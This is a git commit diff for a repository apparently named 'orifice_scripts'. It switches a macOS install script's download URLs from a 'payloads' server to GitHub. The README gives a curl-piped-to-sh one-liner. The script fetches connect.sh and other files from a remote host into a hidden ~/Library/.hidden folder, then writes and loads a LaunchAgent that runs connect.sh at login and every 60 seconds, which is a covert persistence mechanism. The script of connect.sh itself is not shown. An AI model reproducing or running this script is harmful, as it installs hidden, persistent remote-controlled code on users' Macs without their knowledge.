9f335668041498e7b0ed7e743de72f609f8122a5
John D Lund <john.lund@praxent.com>
2016-10-18 12:08:32 -0500

    updates paths to work with github

--- README.md
+++ README.md
@@ -1,1 +1,6 @@
 # orifice_scripts
+
+
+main command example:
+
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/go.sh)"
--- osx/server/go.sh
+++ osx/server/go.sh
@@ -1,5 +1,25 @@
-mkdir ~/Library/.hidden ; cd ~/Library/.hidden ; wget http://mcp.gnerd.io/payloads/orifice/connect.sh ; chmod +x connect.sh
-wget http://mcp.gnerd.io/payloads/orifice/stuff.txt
-mkdir ~/Library/LaunchAgents ; cd ~/Library/LaunchAgents ; wget http://mcp.gnerd.io/payloads/orifice/com.gnerdsec.orifice.plist ; chmod 600 com.gnerdsec.orifice.plist ; launchctl load ~/Library/LaunchAgents/com.gnerdsec.orifice.plist
+mkdir ~/Library/.hidden ; cd ~/Library/.hidden ; wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/connect.sh ; chmod +x connect.sh
+wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/stuff.txt;
+wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/cleanup.sh; chmod +x cleanup.sh;
 
+mkdir ~/Library/LaunchAgents;
 
+echo '<plist version="1.0">
+<dict>
+<key>Label</key>
+<string>com.gnerdsec.orifice</string>
+<key>ProgramArguments</key>
+<array>
+<string>/bin/sh</string>
+<string>'$HOME'/Library/.hidden/connect.sh</string>
+</array>
+<key>RunAtLoad</key>
+<true/>
+<key>StartInterval</key>
+<integer>60</integer>
+<key>AbandonProcessGroup</key>
+<true/>
+</dict>
+</plist>' > ~/Library/LaunchAgents/com.gnerdsec.orifice.plist;
+
+chmod 600 ~/Library/LaunchAgents/com.gnerdsec.orifice.plist ; launchctl load ~/Library/LaunchAgents/com.gnerdsec.orifice.plist
